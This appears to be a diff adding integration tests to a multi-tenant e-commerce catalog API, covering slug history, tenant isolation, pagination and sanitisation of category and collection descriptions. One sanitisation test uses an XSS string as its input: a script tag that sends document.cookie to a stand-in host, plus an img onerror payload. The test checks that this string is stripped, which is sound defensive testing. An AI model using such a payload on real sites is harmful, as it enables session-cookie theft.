@@ -1,7 +1,14 @@
 import { createHash, randomUUID } from "node:crypto";
 
 import { closeRedis } from "@platform/core";
-import { resolveStorefrontSlug } from "@platform/core/catalog/server";
+import {
+  CONSOLE_PAGE_SIZE,
+  getProductForConsole,
+  listMediaForConsole,
+  listProductsForConsole,
+  listTaxonomyForConsole,
+  resolveStorefrontSlug,
+} from "@platform/core/catalog/server";
 import { closeConnections } from "@platform/db";
 import postgres from "postgres";
 import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
@@ -40,6 +47,7 @@ const { PUT: updateProductRoute } = await import("../src/app/api/products/[id]/r
 const { POST: createCategoryRoute } = await import("../src/app/api/categories/route");
 const { PUT: updateCategoryRoute } = await import("../src/app/api/categories/[id]/route");
 const { POST: createCollectionRoute } = await import("../src/app/api/collections/route");
+const { PUT: updateCollectionRoute } = await import("../src/app/api/collections/[id]/route");
 
 const migratorUrl = process.env.DATABASE_URL_MIGRATOR;
 if (!migratorUrl) throw new Error("DATABASE_URL_MIGRATOR must be set to run integration tests");
@@ -775,6 +783,69 @@ describe("categories and collections", () => {
     expect(row!.parent_id).toBeNull();
   });
 
+  it("sanitises category and collection descriptions, not just products'", async () => {
+    sessionToken = ownerToken;
+
+    const hostile =
+      "<p>Warm things for <strong>winter</strong>.</p>" +
+      "<script>fetch('https://evil.test?c='+document.cookie)</script>" +
+      "<img src=x onerror=alert(1)>";
+
+    const category = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: `Sanitised Cat ${randomUUID().slice(0, 6)}`,
+        description: hostile,
+      }),
+    );
+    expect(category.status).toBe(201);
+    const categoryId = ((await category.json()) as { id: string }).id;
+
+    const collection = await createCollectionRoute(
+      jsonRequest("http://console.test/api/collections", {
+        title: `Sanitised Col ${randomUUID().slice(0, 6)}`,
+        description: hostile,
+      }),
+    );
+    expect(collection.status).toBe(201);
+    const collectionId = ((await collection.json()) as { id: string }).id;
+
+    const [categoryRow] = await admin<{ description: string }[]>`
+      SELECT description FROM categories WHERE id = ${categoryId}`;
+    const [collectionRow] = await admin<{ description: string }[]>`
+      SELECT description FROM collections WHERE id = ${collectionId}`;
+
+    // These render through `plainText` on the storefront today, so this
+    // is not live XSS — but the write layer states as an invariant that
+    // a raw description cannot reach a column, and the product PDP was
+    // four diff lines from the same `dangerouslySetInnerHTML` flip.
+    for (const [label, stored] of [
+      ["category", categoryRow!.description],
+      ["collection", collectionRow!.description],
+    ] as const) {
+      expect(stored, label).not.toContain("<script");
+      expect(stored, label).not.toContain("document.cookie");
+      expect(stored, label).not.toContain("onerror");
+      expect(stored, label).not.toContain("<img");
+      expect(stored, label).toContain("<strong>winter</strong>");
+    }
+
+    // And on the way through an update, not only on create.
+    const renamed = await updateCategoryRoute(
+      jsonRequest(
+        `http://console.test/api/categories/${categoryId}`,
+        { title: "Still Sanitised", description: hostile },
+        "PUT",
+      ),
+      { params: Promise.resolve({ id: categoryId }) },
+    );
+    expect(renamed.status).toBe(200);
+
+    const [afterUpdate] = await admin<{ description: string }[]>`
+      SELECT description FROM categories WHERE id = ${categoryId}`;
+    expect(afterUpdate!.description).not.toContain("<script");
+    expect(afterUpdate!.description).toContain("<strong>winter</strong>");
+  });
+
   it("gives a reserved slug a suffix instead of shadowing a storefront route", async () => {
     sessionToken = ownerToken;
 
@@ -786,5 +857,623 @@ describe("categories and collections", () => {
     // `/search` is the storefront's own route; RESERVED_SLUGS keeps a
     // merchant from ever being assigned it.
     expect(await response.json()).toMatchObject({ slug: "search-item" });
+  });
+});
+
+describe("slug history — the guarantee the design exists for", () => {
+  it("keeps the OLDEST slug redirecting after a second rename", async () => {
+    sessionToken = ownerToken;
+
+    const prefix = randomUUID().slice(0, 6);
+    const first = `${prefix}-one`;
+    const created = await createProduct({
+      title: first,
+      status: "active",
+      variants: [{ sku: `${prefix}-CH`, price: "10", weightGrams: 1 }],
+    });
+    expect(created.status).toBe(201);
+
+    const productId = created.data.productId as string;
+    const base = {
+      status: "active",
+      variants: [{ sku: `${prefix}-CH`, price: "10", weightGrams: 1 }],
+    };
+
+    const second = `${prefix}-two`;
+    const third = `${prefix}-three`;
+
+    await updateProduct(productId, { ...base, title: second, slug: second });
+    const renamed = await updateProduct(productId, { ...base, title: third, slug: third });
+    expect(renamed.data.slug).toBe(third);
+
+    // The point: BOTH superseded slugs resolve to the CURRENT canonical
+    // one, not to each other. `resolveSlug` looks up the entity's
+    // canonical slug rather than chaining, so a product renamed twenty
+    // times still costs one redirect — a chain would multiply latency,
+    // and Google stops following them at around five hops.
+    for (const stale of [first, second]) {
+      await expect(resolveStorefrontSlug(tenantA, stale), stale).resolves.toEqual({
+        action: "redirect",
+        to: third,
+        permanent: true,
+      });
+    }
+
+    await expect(resolveStorefrontSlug(tenantA, third)).resolves.toEqual({
+      action: "render",
+      entityType: "product",
+      entityId: productId,
+    });
+
+    const rows = await slugsFor(productId);
+    expect(rows).toHaveLength(3);
+    expect(rows.filter((r) => r.is_canonical)).toHaveLength(1);
+  });
+
+  it("gives the second product a suffix when two want the same slug", async () => {
+    sessionToken = ownerToken;
+
+    const prefix = randomUUID().slice(0, 6);
+    const wanted = `${prefix}-contested`;
+
+    const first = await createProduct({
+      title: wanted,
+      status: "draft",
+      variants: [{ sku: `${prefix}-C1`, price: "10", weightGrams: 1 }],
+    });
+    const second = await createProduct({
+      title: wanted,
+      status: "draft",
+      variants: [{ sku: `${prefix}-C2`, price: "10", weightGrams: 1 }],
+    });
+
+    expect(first.data.slug).toBe(wanted);
+    // Numbering starts at 2 because `-1` reads as a duplicate of
+    // something, while `-2` reads as a second one.
+    expect(second.data.slug).toBe(`${wanted}-2`);
+
+    // Both are reachable, and each resolves to its OWN product.
+    await expect(resolveStorefrontSlug(tenantA, wanted)).resolves.toEqual({
+      action: "render",
+      entityType: "product",
+      entityId: first.data.productId,
+    });
+    await expect(resolveStorefrontSlug(tenantA, `${wanted}-2`)).resolves.toEqual({
+      action: "render",
+      entityType: "product",
+      entityId: second.data.productId,
+    });
+  });
+
+  it("lets two tenants hold the same slug independently", async () => {
+    const prefix = randomUUID().slice(0, 6);
+    const shared = `${prefix}-shared`;
+
+    sessionToken = ownerToken;
+    const mine = await createProduct({
+      title: shared,
+      status: "active",
+      variants: [{ sku: `${prefix}-MINE`, price: "10", weightGrams: 1 }],
+    });
+    expect(mine.data.slug).toBe(shared);
+
+    const theirs = await makeSession(tenantB, "owner");
+    sessionToken = theirs.token;
+    const other = await createProduct({
+      title: shared,
+      status: "active",
+      variants: [{ sku: `${prefix}-THEIRS`, price: "10", weightGrams: 1 }],
+    });
+
+    // No suffix: `url_slugs` is keyed per TENANT, so one merchant taking
+    // /white-shirt must not push the next one onto /white-shirt-2.
+    expect(other.data.slug).toBe(shared);
+
+    // And each tenant resolves it to its own product.
+    await expect(resolveStorefrontSlug(tenantA, shared)).resolves.toMatchObject({
+      action: "render",
+      entityId: mine.data.productId,
+    });
+    await expect(resolveStorefrontSlug(tenantB, shared)).resolves.toMatchObject({
+      action: "render",
+      entityId: other.data.productId,
+    });
+  });
+
+  it("refuses to hand a superseded slug to a different product", async () => {
+    sessionToken = ownerToken;
+
+    const prefix = randomUUID().slice(0, 6);
+    const abandoned = `${prefix}-abandoned`;
+
+    const owner = await createProduct({
+      title: abandoned,
+      status: "active",
+      variants: [{ sku: `${prefix}-OWN`, price: "10", weightGrams: 1 }],
+    });
+    const ownerId = owner.data.productId as string;
+
+    await updateProduct(ownerId, {
+      title: `${prefix}-moved`,
+      slug: `${prefix}-moved`,
+      status: "active",
+      variants: [{ sku: `${prefix}-OWN`, price: "10", weightGrams: 1 }],
+    });
+
+    // A second product now asks for the URL the first one abandoned.
+    const squatter = await createProduct({
+      title: abandoned,
+      status: "active",
+      variants: [{ sku: `${prefix}-SQU`, price: "10", weightGrams: 1 }],
+    });
+
+    // It does not get it. A superseded slug is still OWNED — it is the
+    // redirect keeping the first product's inbound links alive, and
+    // reassigning it would silently point them at a different product.
+    expect(squatter.data.slug).toBe(`${abandoned}-2`);
+
+    await expect(resolveStorefrontSlug(tenantA, abandoned)).resolves.toEqual({
+      action: "redirect",
+      to: `${prefix}-moved`,
+      permanent: true,
+    });
+  });
+});
+
+describe("tenant isolation on every id a payload can name", () => {
+  it("refuses another tenant's category, collection and variant image", async () => {
+    // Built under tenant B by its own owner, so they genuinely exist.
+    const theirs = await makeSession(tenantB, "owner");
+    sessionToken = theirs.token;
+
+    const categoryResponse = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: `Theirs ${randomUUID().slice(0, 6)}`,
+      }),
+    );
+    const foreignCategory = (await categoryResponse.json()) as { id: string };
+
+    const collectionResponse = await createCollectionRoute(
+      jsonRequest("http://console.test/api/collections", {
+        title: `Theirs ${randomUUID().slice(0, 6)}`,
+      }),
+    );
+    const foreignCollection = (await collectionResponse.json()) as { id: string };
+
+    // Tenant A cannot reach any of them. Each is its own request, so a
+    // guard covering only the first field would still be caught.
+    sessionToken = ownerToken;
+
+    const cases: [string, Record<string, unknown>][] = [
+      ["categoryIds", { categoryIds: [foreignCategory.id] }],
+      ["collectionIds", { collectionIds: [foreignCollection.id] }],
+      [
+        "variants[].imageMediaId",
+        {
+          variants: [
+            {
+              sku: `X-${randomUUID().slice(0, 8)}`,
+              price: "10",
+              weightGrams: 1,
+              imageMediaId: foreignMediaId,
+            },
+          ],
+        },
+      ],
+    ];
+
+    for (const [field, payload] of cases) {
+      const { status, data } = await createProduct(productPayload({ title: "Reach", ...payload }));
+      expect(status, field).toBe(422);
+      expect(data, field).toMatchObject({ error: { code: "catalog_invalid" } });
+    }
+
+    // Nothing partial was left behind by any of the three.
+    const [row] = await admin<{ count: string }[]>`
+      SELECT count(*)::int AS count FROM products
+      WHERE tenant_id = ${tenantA} AND title = 'Reach'`;
+    expect(Number(row!.count)).toBe(0);
+  });
+
+  it("refuses another tenant's category as a parent", async () => {
+    const theirs = await makeSession(tenantB, "owner");
+    sessionToken = theirs.token;
+
+    const response = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: `Foreign parent ${randomUUID().slice(0, 6)}`,
+      }),
+    );
+    const foreign = (await response.json()) as { id: string };
+
+    sessionToken = ownerToken;
+    const attempt = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: "Child of a stranger",
+        parentId: foreign.id,
+      }),
+    );
+
+    expect(attempt.status).toBe(422);
+    const body = (await attempt.json()) as {
+      error: { details: { issues: { path: string }[] } };
+    };
+    expect(body.error.details.issues[0]!.path).toBe("parentId");
+  });
+
+  it("404s another tenant's category and collection instead of editing them", async () => {
+    const theirs = await makeSession(tenantB, "owner");
+    sessionToken = theirs.token;
+
+    const categoryResponse = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", { title: "Their Category" }),
+    );
+    const foreignCategory = (await categoryResponse.json()) as { id: string };
+
+    const collectionResponse = await createCollectionRoute(
+      jsonRequest("http://console.test/api/collections", { title: "Their Collection" }),
+    );
+    const foreignCollection = (await collectionResponse.json()) as { id: string };
+
+    sessionToken = ownerToken;
+
+    const categoryAttempt = await updateCategoryRoute(
+      jsonRequest(
+        `http://console.test/api/categories/${foreignCategory.id}`,
+        { title: "Hijacked" },
+        "PUT",
+      ),
+      { params: Promise.resolve({ id: foreignCategory.id }) },
+    );
+    expect(categoryAttempt.status).toBe(404);
+
+    const collectionAttempt = await updateCollectionRoute(
+      jsonRequest(
+        `http://console.test/api/collections/${foreignCollection.id}`,
+        { title: "Hijacked" },
+        "PUT",
+      ),
+      { params: Promise.resolve({ id: foreignCollection.id }) },
+    );
+    expect(collectionAttempt.status).toBe(404);
+
+    const [category] = await admin<{ title: string }[]>`
+      SELECT title FROM categories WHERE id = ${foreignCategory.id}`;
+    const [collection] = await admin<{ title: string }[]>`
+      SELECT title FROM collections WHERE id = ${foreignCollection.id}`;
+    expect(category!.title).toBe("Their Category");
+    expect(collection!.title).toBe("Their Collection");
+  });
+
+  it("deduplicates a repeated id instead of hitting the composite key", async () => {
+    sessionToken = ownerToken;
+
+    const categoryResponse = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: `Dedupe ${randomUUID().slice(0, 6)}`,
+      }),
+    );
+    const category = (await categoryResponse.json()) as { id: string };
+    const mediaId = await makeMedia(tenantA);
+
+    // `product_categories` and `product_media` are keyed on
+    // (tenant, product, other), so the same id twice used to be a
+    // duplicate-key violation surfacing as an opaque 500. Not reachable
+    // from the form — but Task 5's importer calls the same write layer.
+    const { status, data } = await createProduct(
+      productPayload({
+        title: "Repeated Ids",
+        categoryIds: [category.id, category.id],
+        media: [
+          { mediaId, alt: "first wins" },
+          { mediaId, alt: "second ignored" },
+        ],
+      }),
+    );
+
+    expect(status).toBe(201);
+    const productId = data.productId as string;
+
+    const [counts] = await admin<{ categories: string; images: string }[]>`
+      SELECT
+        (SELECT count(*)::int FROM product_categories WHERE product_id = ${productId}) AS categories,
+        (SELECT count(*)::int FROM product_media WHERE product_id = ${productId}) AS images`;
+    expect(Number(counts!.categories)).toBe(1);
+    expect(Number(counts!.images)).toBe(1);
+
+    // The FIRST occurrence wins — it is the one whose position the
+    // merchant chose, and position 0 is the LCP image.
+    const [image] = await admin<{ alt: string }[]>`SELECT alt FROM media WHERE id = ${mediaId}`;
+    expect(image!.alt).toBe("first wins");
+  });
+
+  it("lets an explicit id win over an earlier row's implicit SKU match", async () => {
+    sessionToken = ownerToken;
+
+    const prefix = randomUUID().slice(0, 6);
+    const created = await createProduct({
+      title: `Claim ${prefix}`,
+      status: "draft",
+      axes: [{ name: "Size", values: ["S", "M"] }],
+      variants: [
+        { sku: `${prefix}-A`, options: { Size: "S" }, price: "10", weightGrams: 1 },
+        { sku: `${prefix}-B`, options: { Size: "M" }, price: "20", weightGrams: 2 },
+      ],
+    });
+    const productId = created.data.productId as string;
+
+    const live = await admin<{ id: string; sku: string }[]>`
+      SELECT id, sku FROM product_variants
+      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;
+    const v2 = live.find((r) => r.sku === `${prefix}-B`)!;
+
+    // Index 0 carries NO id and the SKU "B", which matches V2. Index 1
+    // names V2 EXPLICITLY. Resolving in payload order would let index 0
+    // claim V2 by SKU and leave index 1 to insert a fresh row — the
+    // opposite of what the payload asks for.
+    const saved = await updateProduct(productId, {
+      title: `Claim ${prefix}`,
+      status: "draft",
+      axes: [{ name: "Size", values: ["S", "M"] }],
+      variants: [
+        { sku: `${prefix}-B`, options: { Size: "S" }, price: "10", weightGrams: 1 },
+        { id: v2.id, sku: `${prefix}-C`, options: { Size: "M" }, price: "20", weightGrams: 2 },
+      ],
+    });
+    expect(saved.status).toBe(200);
+
+    const after = await admin<{ id: string; sku: string }[]>`
+      SELECT id, sku FROM product_variants
+      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;
+
+    // V2 is the row a Phase 2 order line points at, and it must be the
+    // one the explicit id named — the "C" variant, not the "B" one.
+    expect(after.find((r) => r.id === v2.id)!.sku).toBe(`${prefix}-C`);
+    expect(after.find((r) => r.sku === `${prefix}-B`)!.id).not.toBe(v2.id);
+  });
+});
+
+describe("console catalog queries", () => {
+  /** Its own tenant, so pagination counts cannot drift with other tests. */
+  let queryTenant: string;
+  let queryToken: string;
+  const titles = ["Alpha Widget", "Beta Widget", "Gamma Gadget"];
+  const productIds: string[] = [];
+  let pendingMediaId: string;
+  let readyMediaId: string;
+
+  beforeAll(async () => {
+    queryTenant = await makeTenant();
+    queryToken = (await makeSession(queryTenant, "owner")).token;
+    sessionToken = queryToken;
+
+    readyMediaId = await makeMedia(queryTenant);
+    const [pending] = await admin<{ id: string }[]>`
+      INSERT INTO media (id, tenant_id, storage_key, mime_type, byte_size, status)
+      VALUES (${randomUUID()}, ${queryTenant},
+              ${`${queryTenant}/${randomUUID()}.png`}, 'image/png', 100, 'pending')
+      RETURNING id`;
+    pendingMediaId = pending!.id;
+
+    for (const [i, title] of titles.entries()) {
+      const created = await createProduct({
+        title,
+        status: i === 2 ? "draft" : "active",
+        axes: [{ name: "Size", values: ["S", "M"] }],
+        // Deliberately large amounts: bigint aggregates arrive from the
+        // driver as STRINGS, so these pin the Number() at the boundary.
+        variants: [
+          { sku: `Q-${i}-A`, options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
+          { sku: `Q-${i}-B`, options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
+        ],
+        media:
+          i === 0
+            ? [
+                { mediaId: readyMediaId, alt: "hero" },
+                { mediaId: pendingMediaId, alt: "second" },
+              ]
+            : [],
+      });
+      expect(created.status).toBe(201);
+      productIds.push(created.data.productId as string);
+    }
+
+    sessionToken = undefined;
+  });
+
+  it("returns every product with an exact total and price range", async () => {
+    const { items, total } = await listProductsForConsole(queryTenant);
+
+    expect(total).toBe(3);
+    expect(items).toHaveLength(3);
+
+    const alpha = items.find((i) => i.title === "Alpha Widget")!;
+    // Exact integers, not strings. `min()`/`max()` over bigint come back
+    // from the driver as strings; without the Number() at the boundary
+    // these would be "1234567890" and "9999999999", and this fails.
+    expect(alpha.minPricePaise).toBe(1234567890);
+    expect(alpha.maxPricePaise).toBe(9999999999);
+    expect(typeof alpha.minPricePaise).toBe("number");
+    expect(alpha.variantCount).toBe(2);
+    expect(alpha.currency).toBe("INR");
+    expect(alpha.slug).toBe("alpha-widget");
+  });
+
+  it("shows drafts, which the storefront listing must never do", async () => {
+    const { items } = await listProductsForConsole(queryTenant);
+    expect(items.map((i) => i.status).sort()).toEqual(["active", "active", "draft"]);
+  });
+
+  it("filters by status", async () => {
+    const active = await listProductsForConsole(queryTenant, { status: "active" });
+    expect(active.total).toBe(2);
+    expect(active.items.every((i) => i.status === "active")).toBe(true);
+
+    const draft = await listProductsForConsole(queryTenant, { status: "draft" });
+    expect(draft.total).toBe(1);
+    expect(draft.items[0]!.title).toBe("Gamma Gadget");
+
+    const archived = await listProductsForConsole(queryTenant, { status: "archived" });
+    expect(archived.total).toBe(0);
+    expect(archived.items).toEqual([]);
+  });
+
+  it("searches by title and by SKU", async () => {
+    // Title. Two of the three are "… Widget".
+    const byTitle = await listProductsForConsole(queryTenant, { search: "widget" });
+    expect(byTitle.total).toBe(2);
+
+    // SKU, through the hand-written EXISTS subquery — a merchant who
+    // types a SKU into a product search and gets nothing concludes the
+    // product is missing.
+    const bySku = await listProductsForConsole(queryTenant, { search: "Q-2-A" });
+    expect(bySku.total).toBe(1);
+    expect(bySku.items[0]!.title).toBe("Gamma Gadget");
+
+    const noMatch = await listProductsForConsole(queryTenant, { search: "nothing-matches-this" });
+    expect(noMatch.total).toBe(0);
+    expect(noMatch.items).toEqual([]);
+  });
+
+  it("treats LIKE metacharacters in a search as literals", async () => {
+    // An unescaped `%` would match every product rather than none, which
+    // reads as "search is broken" the first time a merchant types one.
+    const wildcard = await listProductsForConsole(queryTenant, { search: "%" });
+    expect(wildcard.total).toBe(0);
+
+    const underscore = await listProductsForConsole(queryTenant, { search: "_lpha" });
+    expect(underscore.total).toBe(0);
+  });
+
+  it("pages with a stable total and no overlap", async () => {
+    const first = await listProductsForConsole(queryTenant, { limit: 2, offset: 0 });
+    const second = await listProductsForConsole(queryTenant, { limit: 2, offset: 2 });
+
+    // The total is of the whole filtered set, not of the page.
+    expect(first.total).toBe(3);
+    expect(second.total).toBe(3);
+    expect(first.items).toHaveLength(2);
+    expect(second.items).toHaveLength(1);
+
+    // Ordering is deterministic — updatedAt then id — so the pages
+    // partition the set rather than repeating a row across the boundary.
+    const seen = [...first.items, ...second.items].map((i) => i.id);
+    expect(new Set(seen).size).toBe(3);
+
+    const past = await listProductsForConsole(queryTenant, { limit: 2, offset: 99 });
+    expect(past.total).toBe(3);
+    expect(past.items).toEqual([]);
+  });
+
+  it("clamps a hostile limit rather than trusting it", async () => {
+    expect((await listProductsForConsole(queryTenant, { limit: 10_000 })).items.length).toBe(3);
+    expect((await listProductsForConsole(queryTenant, { limit: 0 })).items.length).toBe(1);
+    expect((await listProductsForConsole(queryTenant, { offset: -5 })).items.length).toBe(3);
+    // Pinned, not read from the constant under test.
+    expect(CONSOLE_PAGE_SIZE).toBe(25);
+  });
+
+  it("reports the hero image at position 0 with its real status", async () => {
+    const all = await listProductsForConsole(queryTenant);
+    const alpha = all.items.find((i) => i.title === "Alpha Widget")!;
+
+    // Position 0, and NOT filtered to `ready` the way the storefront
+    // filters: a merchant must be able to see that their own image is
+    // still processing rather than have it silently missing.
+    expect(alpha.image).not.toBeNull();
+    expect(alpha.image!.status).toBe("ready");
+    expect(alpha.image!.alt).toBe("hero");
+
+    expect(all.items.find((i) => i.title === "Gamma Gadget")!.image).toBeNull();
+  });
+
+  it("loads a product for the edit form, pending media included", async () => {
+    const product = await getProductForConsole(queryTenant, productIds[0]!);
+
+    expect(product).not.toBeNull();
+    expect(product!.title).toBe("Alpha Widget");
+    expect(product!.slug).toBe("alpha-widget");
+    expect(product!.historicalSlugs).toEqual([]);
+    expect(product!.variants).toHaveLength(2);
+    expect(product!.variants[0]!.pricePaise).toBe(1234567890);
+    // Both images, including the one the worker has not finished.
+    expect(product!.media.map((m) => m.status).sort()).toEqual(["pending", "ready"]);
+  });
+
+  it("returns null for a product belonging to another tenant", async () => {
+    // The console read path carries an explicit tenant predicate on top
+    // of RLS; this pins that a foreign id is a miss, not a leak.
+    await expect(getProductForConsole(tenantA, productIds[0]!)).resolves.toBeNull();
+    await expect(getProductForConsole(queryTenant, randomUUID())).resolves.toBeNull();
+  });
+
+  it("carries historical slugs onto the edit form after a rename", async () => {
+    sessionToken = queryToken;
+    await updateProduct(productIds[1]!, {
+      title: "Beta Widget",
+      slug: "beta-widget-renamed",
+      status: "active",
+      axes: [{ name: "Size", values: ["S", "M"] }],
+      variants: [
+        { sku: "Q-1-A", options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
+        { sku: "Q-1-B", options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
+      ],
+    });
+    sessionToken = undefined;
+
+    const product = await getProductForConsole(queryTenant, productIds[1]!);
+    expect(product!.slug).toBe("beta-widget-renamed");
+    expect(product!.historicalSlugs).toEqual(["beta-widget"]);
+  });
+
+  it("lists hidden taxonomy with product counts, unlike the storefront", async () => {
+    sessionToken = queryToken;
+
+    const visible = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", { title: "Visible Cat" }),
+    );
+    const hidden = await createCategoryRoute(
+      jsonRequest("http://console.test/api/categories", {
+        title: "Hidden Cat",
+        isVisible: false,
+      }),
+    );
+    const visibleId = ((await visible.json()) as { id: string }).id;
+    const hiddenId = ((await hidden.json()) as { id: string }).id;
+
+    await updateProduct(productIds[2]!, {
+      title: "Gamma Gadget",
+      slug: "gamma-gadget",
+      status: "draft",
+      categoryIds: [visibleId],
+      axes: [{ name: "Size", values: ["S", "M"] }],
+      variants: [
+        { sku: "Q-2-A", options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
+        { sku: "Q-2-B", options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
+      ],
+    });
+    sessionToken = undefined;
+
+    const taxonomy = await listTaxonomyForConsole(queryTenant);
+
+    // `listCategories` filters `is_visible`, which is right for a
+    // storefront and wrong here — a merchant who hides a category must
+    // still be able to find it again to unhide it.
+    const found = taxonomy.categories.find((c) => c.id === hiddenId);
+    expect(found).toBeDefined();
+    expect(found!.isVisible).toBe(false);
+    expect(found!.slug).toBe("hidden-cat");
+
+    expect(taxonomy.categories.find((c) => c.id === visibleId)!.productCount).toBe(1);
+    expect(found!.productCount).toBe(0);
+  });
+
+  it("lists the tenant's media, newest first, without another tenant's", async () => {
+    const library = await listMediaForConsole(queryTenant);
+
+    expect(library.map((m) => m.id)).toContain(readyMediaId);
+    expect(library.map((m) => m.id)).toContain(pendingMediaId);
+    expect(library.map((m) => m.id)).not.toContain(foreignMediaId);
+    expect(library.find((m) => m.id === pendingMediaId)!.status).toBe("pending");
   });
 });
